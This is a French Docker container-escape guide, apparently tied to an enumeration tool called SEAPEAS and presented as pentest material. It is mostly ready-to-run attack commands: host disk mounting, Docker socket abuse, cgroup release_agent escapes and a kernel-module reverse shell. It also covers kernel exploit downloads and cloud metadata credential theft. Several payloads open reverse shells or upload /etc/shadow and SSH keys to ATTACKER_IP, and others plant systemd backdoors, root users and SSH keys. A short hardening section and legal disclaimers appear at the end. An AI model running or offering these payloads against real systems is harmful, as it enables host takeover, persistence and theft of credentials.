

# 🔓 Guide d'Évasion Docker - Techniques Critiques

> **⚠️ AVERTISSEMENT LÉGAL**  
> Ce document est destiné **uniquement** à des tests d'intrusion autorisés.  
> L'utilisation non autorisée de ces techniques constitue une infraction pénale.

---

## 📋 Table des matières

1. [Mode Privilégié](#1-mode-privilégié)
2. [Socket Docker Exposé](#2-socket-docker-exposé)
3. [Montages de Volumes Sensibles](#3-montages-de-volumes-sensibles)
4. [Capabilities Dangereuses](#4-capabilities-dangereuses)
5. [Exploitation des Cgroups](#5-exploitation-des-cgroups)
6. [Vulnérabilités Kernel](#6-vulnérabilités-kernel)
7. [Vulnérabilités runc](#7-vulnérabilités-runc)
8. [Services de Métadonnées Cloud](#8-services-de-métadonnées-cloud)
9. [Namespace Non Isolés](#9-namespace-non-isolés)
10. [Modules de Sécurité Désactivés](#10-modules-de-sécurité-désactivés)

---

## 1. Mode Privilégié

### 🎯 Détection

**Indicateur SEAPEAS** : `[!!!] CRITICAL: Container is running in PRIVILEGED MODE!`

```bash
# Vérification manuelle
if [ -c /dev/kmsg ]; then
    echo "Mode privilégié détecté !"
fi

# Ou vérifier la présence de devices
ls -la /dev/sd* 2>/dev/null
```

### 🔓 Exploitation

Quand un conteneur est en mode privilégié (`--privileged`), il a accès à tous les devices du système hôte.

```bash
# 1. Lister les devices disponibles
ls -la /dev/

# 2. Identifier le disque principal (généralement sda1, vda1, ou xvda1)
fdisk -l
lsblk

# 3. Créer un point de montage
mkdir -p /mnt/hostfs

# 4. Monter le système de fichiers hôte
mount /dev/sda1 /mnt/hostfs

# 5. Accéder au système via chroot
chroot /mnt/hostfs /bin/bash

# 6. Vous êtes maintenant root sur l'hôte !
cat /mnt/hostfs/etc/shadow
```

### 💡 Variantes

```bash
# Si chroot ne fonctionne pas, accès direct aux fichiers
cat /mnt/hostfs/etc/shadow
cat /mnt/hostfs/root/.ssh/id_rsa

# Ajouter une clé SSH
mkdir -p /mnt/hostfs/root/.ssh
echo "YOUR_SSH_PUBLIC_KEY" >> /mnt/hostfs/root/.ssh/authorized_keys

# Créer un utilisateur root
echo 'hacker:$6$salt$hash:0:0:root:/root:/bin/bash' >> /mnt/hostfs/etc/passwd
```

---

## 2. Socket Docker Exposé

### 🎯 Détection

**Indicateur SEAPEAS** : `[!!!] CRITICAL: DOCKER SOCKET FOUND at /var/run/docker.sock!`

```bash
# Vérification manuelle
ls -la /var/run/docker.sock

# Ou recherche globale
find / -name "*.sock" 2>/dev/null | grep docker
```

### 🔓 Exploitation

Le socket Docker permet de contrôler totalement le daemon Docker de l'hôte.

#### Méthode 1 : Client Docker disponible

```bash
# Vérifier si docker est installé
which docker

# Lister les conteneurs
docker ps -a

# Créer un conteneur privilégié avec accès à l'hôte
docker run -v /:/hostfs -it ubuntu chroot /hostfs /bin/bash

# Ou avec Alpine (plus léger)
docker run -v /:/hostfs -it alpine chroot /hostfs /bin/sh
```

#### Méthode 2 : Sans client Docker

```bash
# Installer le client Docker
curl -fsSL https://get.docker.com -o get-docker.sh
sh get-docker.sh

# Ou téléchargement direct du binaire
wget https://download.docker.com/linux/static/stable/x86_64/docker-20.10.9.tgz
tar xzvf docker-20.10.9.tgz
cp docker/docker /usr/local/bin/
```

#### Méthode 3 : API Docker directe (via curl)

```bash
# Lister les conteneurs
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json

# Créer un conteneur privilégié
curl -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["sh"],
    "HostConfig": {
      "Binds": ["/:/hostfs"],
      "Privileged": true
    }
  }' \
  http://localhost/containers/create

# Démarrer le conteneur (remplacer CONTAINER_ID)
curl -X POST --unix-socket /var/run/docker.sock \
  http://localhost/containers/CONTAINER_ID/start

# Exécuter une commande
curl -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"AttachStdout": true, "Cmd": ["chroot", "/hostfs", "/bin/bash"]}' \
  http://localhost/containers/CONTAINER_ID/exec
```

### 💡 Post-exploitation

```bash
# Une fois sur l'hôte via le nouveau conteneur
# Ajouter une backdoor systemd
cat > /hostfs/etc/systemd/system/backdoor.service <<EOF
[Unit]
Description=Backdoor Service

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Activer la backdoor
chroot /hostfs systemctl enable backdoor.service
```

---

## 3. Montages de Volumes Sensibles

### 🎯 Détection

**Indicateur SEAPEAS** : `[!!!] CRITICAL: Potential host filesystem mount detected!`

```bash
# Vérifier tous les montages
mount | grep -v "overlay\|proc\|tmpfs\|devpts"

# Vérifier les partitions montées
df -h

# Rechercher des répertoires suspects
ls -la / | grep -E "host|rootfs|mnt"
```

### 🔓 Exploitation

#### Scénario 1 : Disque hôte accessible (/dev/sda1)

```bash
# Si /dev/sda1 est accessible mais pas encore monté
mkdir -p /mnt/hostfs
mount /dev/sda1 /mnt/hostfs
chroot /mnt/hostfs /bin/bash
```

#### Scénario 2 : Répertoire hôte déjà monté

```bash
# Si /host existe et contient le système hôte
ls -la /host

# Accès direct aux fichiers sensibles
cat /host/etc/shadow
cat /host/root/.ssh/id_rsa

# Modification de fichiers critiques
echo "hacker ALL=(ALL) NOPASSWD:ALL" >> /host/etc/sudoers

# Ajout de clé SSH
mkdir -p /host/root/.ssh
echo "ssh-rsa AAAA..." >> /host/root/.ssh/authorized_keys
chmod 600 /host/root/.ssh/authorized_keys
```

#### Scénario 3 : Socket ou PID hôte monté

```bash
# Si /proc de l'hôte est accessible
ls -la /host/proc/1/

# Injection dans un processus hôte via /proc
# (Technique avancée nécessitant des capabilities spécifiques)
```

### 💡 Fichiers sensibles à cibler

```bash
# Credentials et secrets
/etc/shadow                     # Hashes des mots de passe
/root/.ssh/id_rsa              # Clés SSH privées
/home/*/.ssh/id_rsa            # Clés utilisateurs
/root/.bash_history            # Historique de commandes
/var/log/auth.log              # Logs d'authentification

# Configuration système
/etc/passwd                     # Comptes utilisateurs
/etc/sudoers                    # Configuration sudo
/etc/crontab                    # Tâches planifiées
/etc/systemd/system/           # Services systemd

# Credentials d'applications
/var/www/html/config.php       # Config web
/root/.aws/credentials         # AWS credentials
/root/.docker/config.json      # Docker credentials
/etc/kubernetes/               # Kubernetes configs
```

---

## 4. Capabilities Dangereuses

### 🎯 Détection

**Indicateur SEAPEAS** : `[!!!] CRITICAL: CAP_SYS_ADMIN is enabled!`

```bash
# Vérifier les capabilities
capsh --print

# Ou via /proc
cat /proc/self/status | grep Cap

# Décoder les capabilities
capsh --decode=00000000a80425fb
```

### 🔓 Exploitation par Capability

#### CAP_SYS_ADMIN

La plus dangereuse - permet de monter des systèmes de fichiers.

```bash
# Vérifier la présence
capsh --print | grep cap_sys_admin

# Exploitation
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# Technique d'évasion via release_agent
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Créer le payload
cat > /cmd << EOF
#!/bin/sh
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod a+x /cmd

# Déclencher l'exécution sur l'hôte
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

#### CAP_SYS_MODULE

Permet de charger des modules kernel.

```bash
# Vérifier la présence
capsh --print | grep cap_sys_module

# Créer un module kernel malveillant
cat > reverse-shell.c << EOF
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Attacker");
MODULE_DESCRIPTION("Reverse Shell");
MODULE_VERSION("1.0");

static int __init reverse_shell_init(void) {
    char *argv[] = {"/bin/bash", "-c", 
                    "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1", NULL};
    static char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:"
                           "/usr/sbin:/usr/bin:/sbin:/bin", NULL};
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return 0;
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
EOF

# Compiler et charger le module
# (Nécessite les headers kernel correspondants)
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
insmod reverse-shell.ko
```

#### CAP_SYS_PTRACE

Permet de déboguer et injecter du code dans d'autres processus.

```bash
# Vérifier la présence
capsh --print | grep cap_sys_ptrace

# Trouver un processus hôte
ps aux

# Injection de shellcode (nécessite des outils comme gdb)
# Cette technique est complexe et dépend de l'architecture
```

#### CAP_DAC_READ_SEARCH

Contourne les vérifications de permissions de lecture.

```bash
# Vérifier la présence
capsh --print | grep cap_dac_read_search

# Lire n'importe quel fichier
cat /etc/shadow
cat /root/.ssh/id_rsa
find / -name "*.key" -exec cat {} \;
```

#### CAP_SYS_RAWIO

Accès direct aux I/O, peut lire/écrire directement sur le disque.

```bash
# Vérifier la présence
capsh --print | grep cap_sys_rawio

# Lire directement depuis le disque
dd if=/dev/sda of=/tmp/disk.img bs=1M count=100

# Monter une partition
mkdir /mnt/raw
mount /dev/sda1 /mnt/raw
```

### 💡 Matrice des Capabilities

| Capability | Niveau de risque | Évasion possible |
|-----------|------------------|------------------|
| CAP_SYS_ADMIN | 🔴 Critique | ✅ Oui (cgroups, mount) |
| CAP_SYS_MODULE | 🔴 Critique | ✅ Oui (kernel modules) |
| CAP_SYS_RAWIO | 🔴 Critique | ✅ Oui (accès disque direct) |
| CAP_SYS_PTRACE | 🟠 Élevé | ✅ Oui (injection processus) |
| CAP_DAC_READ_SEARCH | 🟠 Élevé | ⚠️ Partiel (lecture seule) |
| CAP_NET_ADMIN | 🟡 Moyen | ⚠️ Partiel (pivot réseau) |
| CAP_SYS_BOOT | 🟡 Moyen | ❌ Non (mais DoS possible) |

---

## 5. Exploitation des Cgroups

### 🎯 Détection

**Indicateur SEAPEAS** : `[!] HIGH: Writable cgroup found: /sys/fs/cgroup/...`

```bash
# Vérifier les cgroups
cat /proc/self/cgroup

# Vérifier les permissions d'écriture
ls -la /sys/fs/cgroup/
find /sys/fs/cgroup -writable 2>/dev/null

# Vérifier release_agent
cat /sys/fs/cgroup/release_agent 2>/dev/null
```

### 🔓 Exploitation - Release Agent

Technique classique d'évasion Docker via cgroups.

```bash
# Script complet d'évasion via release_agent
#!/bin/bash

# 1. Créer un nouveau cgroup
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# 2. Activer notify_on_release
echo 1 > /tmp/cgrp/x/notify_on_release

# 3. Trouver le chemin du conteneur sur l'hôte
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "Host path: $host_path"

# 4. Créer le payload qui sera exécuté sur l'hôte
cat > /cmd << 'EOF'
#!/bin/bash
# Ce script s'exécutera sur l'HÔTE
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
EOF
chmod a+x /cmd

# 5. Configurer le release_agent pour pointer vers notre payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 6. Déclencher l'exécution en tuant un processus dans le cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
```

### 💡 Variantes de Payload

```bash
# Reverse shell
echo '#!/bin/bash' > /cmd
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /cmd

# Ajouter une clé SSH
echo '#!/bin/bash' > /cmd
echo 'mkdir -p /root/.ssh' >> /cmd
echo 'echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys' >> /cmd

# Créer un utilisateur backdoor
echo '#!/bin/bash' > /cmd
echo 'useradd -m -s /bin/bash hacker' >> /cmd
echo 'echo "hacker:password" | chpasswd' >> /cmd
echo 'usermod -aG sudo hacker' >> /cmd

# Exfiltrer des données
echo '#!/bin/bash' > /cmd
echo 'tar czf /tmp/loot.tar.gz /etc/shadow /root/.ssh' >> /cmd
echo 'curl -F "file=@/tmp/loot.tar.gz" http://ATTACKER_IP:8000/upload' >> /cmd
```

---

## 6. Vulnérabilités Kernel

### 🎯 Détection

**Indicateur SEAPEAS** : Affiche la version kernel et les CVE connues

```bash
# Vérifier la version du kernel
uname -a
uname -r

# Informations détaillées
cat /proc/version
```

### 🔓 Exploits Kernel Connus

#### DirtyCow (CVE-2016-5195)

**Versions affectées** : Kernel < 4.8.3

```bash
# Vérifier la vulnérabilité
uname -r

# Télécharger et compiler l'exploit
wget https://github.com/dirtycow/dirtycow.github.io/raw/master/pokemon.c
gcc -pthread pokemon.c -o pokemon -lcrypt

# Exécuter (crée un utilisateur firefart:root)
./pokemon
su firefart
# Password: dirtyCowFun
```

#### DirtyPipe (CVE-2022-0847)

**Versions affectées** : 
- Kernel 5.8 - 5.16.11
- Kernel 5.15.x - 5.15.25  
- Kernel 5.10.x - 5.10.102

```bash
# Vérifier la vulnérabilité
uname -r

# Exploitation (exemple avec /etc/passwd)
# L'exploit permet d'écrire dans des fichiers en lecture seule
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
gcc exploit-1.c -o exploit-1
./exploit-1
```

#### OverlayFS (CVE-2021-3493)

**Versions affectées** : Ubuntu kernels avec OverlayFS

```bash
# Vérifier la vulnérabilité
cat /proc/filesystems | grep overlay

# Exploitation
git clone https://github.com/briskets/CVE-2021-3493.git
cd CVE-2021-3493
make
./exploit
```

#### Netfilter (CVE-2021-22555)

**Versions affectées** : Kernel < 5.11.15

```bash
# Exploitation
git clone https://github.com/google/security-research.git
cd security-research/pocs/linux/cve-2021-22555
make
./exploit
```

### 💡 Vérification automatique

```bash
# Script de vérification de vulnérabilités kernel
#!/bin/bash

KERNEL_VERSION=$(uname -r | cut -d'.' -f1-2)
KERNEL_FULL=$(uname -r)

echo "[*] Kernel version: $KERNEL_FULL"

# Vérifier DirtyCow
if [ "$(echo "$KERNEL_VERSION < 4.8" | bc)" -eq 1 ]; then
    echo "[!] Vulnerable to DirtyCow (CVE-2016-5195)"
fi

# Vérifier DirtyPipe
MAJOR=$(echo $KERNEL_VERSION | cut -d'.' -f1)
MINOR=$(echo $KERNEL_VERSION | cut -d'.' -f2)
if [ "$MAJOR" -eq 5 ] && [ "$MINOR" -ge 8 ] && [ "$MINOR" -le 16 ]; then
    echo "[!] Potentially vulnerable to DirtyPipe (CVE-2022-0847)"
fi

# Vérifier OverlayFS
if grep -q overlay /proc/filesystems && grep -qi ubuntu /etc/os-release; then
    echo "[!] Potentially vulnerable to OverlayFS (CVE-2021-3493)"
fi
```

---

## 7. Vulnérabilités runc

### 🎯 Détection

```bash
# Vérifier la version de runc
runc --version

# Vérifier si runc est utilisé
ps aux | grep runc
```

### 🔓 CVE-2019-5736 - runc Container Breakout

**Versions affectées** : runc < 1.0-rc6

C'est une des vulnérabilités les plus critiques de Docker permettant une évasion complète.

```bash
# POC disponible sur :
# https://github.com/Frichetten/CVE-2019-5736-PoC

# Étapes générales :
# 1. L'attaquant doit pouvoir exécuter du code dans le conteneur
# 2. Remplacer le binaire /bin/sh par un payload malveillant
# 3. Quand un admin exécute "docker exec", le payload s'exécute sur l'hôte

# Exemple de payload (simplifié)
cat > /tmp/payload << 'EOF'
#!/bin/bash
# Ce code s'exécutera sur l'HÔTE
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
EOF

# L'exploit complet nécessite de modifier /proc/self/exe
# (Code Go complexe disponible dans les POC publics)
```

### 🔓 CVE-2024-21626 - File Descriptor Leak

**Versions affectées** : runc < 1.1.12

```bash
# Cette vulnérabilité permet de "leaked" des file descriptors
# et potentiellement d'accéder au filesystem de l'hôte
# POC encore en développement
```

---

## 8. Services de Métadonnées Cloud

### 🎯 Détection

**Indicateur SEAPEAS** : `[!] HIGH: AWS/GCP/Azure metadata service accessible!`

```bash
# Test AWS
curl -s http://169.254.169.254/latest/meta-data/

# Test GCP
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/

# Test Azure
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### 🔓 Exploitation AWS

```bash
# Récupérer les credentials IAM
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Récupérer le rôle
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)

# Récupérer les credentials du rôle
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE

# Exemple de réponse :
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "..."
# }

# Utiliser les credentials
export AWS_ACCESS_KEY_ID="..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Énumérer les ressources AWS
aws s3 ls
aws ec2 describe-instances
aws iam get-user
```

### 🔓 Exploitation GCP

```bash
# Récupérer le token d'accès
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Récupérer des informations sur le projet
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/project-id"

# Utiliser le token
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  | jq -r '.access_token')

# Accéder aux ressources GCP
curl -H "Authorization: Bearer $TOKEN" \
  "https://www.googleapis.com/compute/v1/projects/PROJECT_ID/zones/ZONE/instances"
```

### 🔓 Exploitation Azure

```bash
# Récupérer le token
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Informations sur l'instance
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq

# Utiliser le token
TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | jq -r '.access_token')

# Accéder aux ressources Azure
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

---

## 9. Namespace Non Isolés

### 🎯 Détection

**Indicateur SEAPEAS** : `[!!!] CRITICAL: PID namespace is NOT isolated - sharing with host!`

```bash
# Comparer les namespaces
ls -la /proc/1/ns/
ls -la /proc/self/ns/

# Vérifier si on partage le même namespace que l'hôte
readlink /proc/1/ns/pid
readlink /proc/self/ns/pid

# Si les liens sont identiques, pas d'isolation !
```

### 🔓 Exploitation

#### PID Namespace partagé (--pid=host)

```bash
# Si le PID namespace est partagé avec l'hôte
# Vous pouvez voir TOUS les processus de l'hôte

# Lister tous les processus
ps aux

# Trouver des processus intéressants
ps aux | grep -E "ssh|cron|systemd"

# Accéder au filesystem via /proc
ls -la /proc/1/root/
cat /proc/1/root/etc/shadow

# Dump de la mémoire d'un processus
gdb -p PID
(gdb) generate-core-file /tmp/process.core
(gdb) quit

# Chercher des secrets en mémoire
strings /tmp/process.core | grep -i "password\|token\|key"
```

#### Network Namespace partagé (--net=host)

```bash
# Si le network namespace est partagé
# Vous avez accès à toutes les interfaces réseau de l'hôte

# Voir toutes les interfaces
ip addr
ifconfig -a

# Sniffing du trafic réseau
tcpdump -i eth0 -w /tmp/capture.pcap

# Port scanning interne
for port in {1..65535}; do
    timeout 1 bash -c "echo >/dev/tcp/localhost/$port" 2>/dev/null && 
    echo "Port $port ouvert"
done
```

#### Mount Namespace partagé

```bash
# Accès direct au filesystem de l'hôte
mount | grep -v overlay
df -h

# Montage de partitions additionnelles
lsblk
mount /dev/sda2 /mnt
```

---

## 10. Modules de Sécurité Désactivés

### 🎯 Détection

```bash
# AppArmor
cat /proc/self/attr/current
aa-status

# SELinux  
getenforce
cat /sys/fs/selinux/enforce

# Seccomp
grep Seccomp /proc/self/status
```

### 🔓 Exploitation

#### AppArmor désactivé ou en mode unconfined

```bash
# Vérifier le profil
cat /proc/self/attr/current

# Si "unconfined", aucune restriction AppArmor
# Toutes les syscalls sont disponibles

# Exploitation :
# - Accès complet au filesystem
# - Possibilité d'utiliser toutes les capabilities
# - Pas de restriction sur les opérations réseau
```

#### SELinux désactivé ou en mode permissive

```bash
# Vérifier le mode
getenforce
# Si "Permissive" ou "Disabled"

# Exploitation :
# - Bypass de toutes les policies SELinux
# - Accès aux fichiers normalement protégés
# - Possibilité de modifier les contextes de sécurité
```

#### Seccomp désactivé

```bash
# Vérifier Seccomp
grep Seccomp /proc/self/status
# Si Seccomp: 0, aucun filtre actif

# Exploitation :
# - Toutes les syscalls sont disponibles
# - Pas de restriction sur les appels système dangereux
# - Possibilité d'utiliser ptrace, mount, etc.

# Syscalls dangereuses à exploiter :
# - mount / umount
# - ptrace
# - reboot
# - swapon / swapoff
# - keyctl
```

---

## 🛡️ Détection et Prévention

### Bonnes Pratiques de Sécurité Docker

```yaml
# docker-compose.yml sécurisé
version: '3.8'
services:
  app:
    image: myapp:latest
    # NE JAMAIS faire ça :
    # privileged: true
    # volumes:
    #   - /:/host
    #   - /var/run/docker.sock:/var/run/docker.sock
    
    # Bonnes pratiques :
    security_opt:
      - no-new-privileges:true
      - apparmor:docker-default
      - seccomp:default
    
    cap_drop:
      - ALL
    
    cap_add:
      - NET_BIND_SERVICE  # Seulement si nécessaire
    
    read_only: true
    
    tmpfs:
      - /tmp
      - /var/tmp
    
    user: "1000:1000"  # Non-root user
```

### Commandes de Vérification Rapide

```bash
# Audit rapide d'un conteneur
docker inspect CONTAINER_ID | jq '.[0].HostConfig | {
  Privileged,
  CapAdd,
  CapDrop,
  SecurityOpt,
  Binds
}'

# Vérifier les conteneurs privilégiés
docker ps --quiet | xargs docker inspect --format '{{.Name}}: Privileged={{.HostConfig.Privileged}}'

# Lister les volumes montés
docker ps --quiet | xargs docker inspect --format '{{.Name}}: {{range .Mounts}}{{.Source}}:{{.Destination}} {{end}}'
```

---

## 📚 Ressources Supplémentaires

### Outils d'Énumération

- **SEAPEAS** : Ce script
- **LinPEAS** : Linux Privilege Escalation Awesome Script
- **Docker Bench Security** : Audit de sécurité Docker
- **Trivy** : Scanner de vulnérabilités pour conteneurs

### Documentation

- [Docker Security Best Practices](https://docs.docker.com/engine/security/)
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
- [OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)

### POC et Exploits

- [HackTricks - Docker Breakout](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout)
- [TrailOfBits - Docker Exploitation](https://github.com/trailofbits/audit-kubernetes)
- [GTFOBins](https://gtfobins.github.io/) - Binaires pour privilege escalation

---

## ⚖️ Disclaimer Légal

Ce document est fourni **à des fins éducatives uniquement**. L'utilisation de ces techniques sans autorisation explicite et écrite est **illégale** et peut entraîner :

- Des poursuites pénales
- Des amendes importantes
- Une peine de prison
- Des dommages et intérêts civils

**Utilisez ces connaissances de manière responsable et éthique.**

---

## 📝 Checklist Pentest Docker

- [ ] Vérifier le mode privilégié
- [ ] Rechercher le socket Docker
- [ ] Analyser les montages de volumes
- [ ] Énumérer les capabilities
- [ ] Tester les cgroups (release_agent)
- [ ] Identifier la version du kernel
- [ ] Vérifier runc et containerd
- [ ] Tester les services de métadonnées cloud
- [ ] Analyser l'isolation des namespaces
- [ ] Vérifier AppArmor/SELinux/Seccomp
- [ ] Rechercher des fichiers SUID/SGID
- [ ] Examiner les variables d'environnement
- [ ] Analyser les processus en cours
- [ ] Tester la configuration réseau
- [ ] Rechercher des secrets/credentials

---

**Version** : 1.0  
**Dernière mise à jour** : Octobre 2025  
**Auteur** : SEAPEAS Project
